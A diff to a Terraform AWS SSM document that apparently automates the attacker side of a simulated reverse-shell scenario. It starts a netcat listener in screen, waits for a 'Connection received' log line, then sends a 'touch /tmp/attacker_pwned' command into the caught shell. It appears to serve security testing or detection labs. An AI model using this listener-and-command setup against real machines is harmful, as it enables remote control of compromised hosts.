@@ -27,12 +27,17 @@ resource "aws_ssm_document" "exec_reverse_shell_attacker" {
                     "runCommand": [
                         "echo \"Starting listener: ${local.listen_ip}:${local.listen_port}\" > /tmp/attacker_exec_reverseshell_listener.log",
                         "screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill",
-                        "screen -d -L /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}",
-                        "echo \"Listener started...\" >> /tmp/attacker_exec_reverseshell_listener.log 2>&1 ",
+                        "screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}",
+                        "screen -S netcat -X colon \"logfile flush 0^M\"",
+                        "echo \"Listener started..\" >> /tmp/attacker_exec_reverseshell_listener.log 2>&1 ",
                         "touch /tmp/attacker_exec_reverseshell_listener",
+                        "until tail /tmp/netcat.log | grep -m 1 \"Connection received\"; do echo \"waiting for connection...\" >> /tmp/attacker_exec_reverseshell_listener.log; sleep 10; done",
+                        "sleep 30",
+                        "echo \"sending screen command: touch /tmp/attacker_pwned\" >> /tmp/attacker_exec_reverseshell_listener.log",
+                        "screen -S netcat -p 0 -X stuff \"touch /tmp/attacker_pwned^M\"",
+                        "sleep 300"
                     ]
                 }
-                #screen -S netcat -p 0 -X stuff "touch /tmp/pwned^M"
             }
         ]
     })
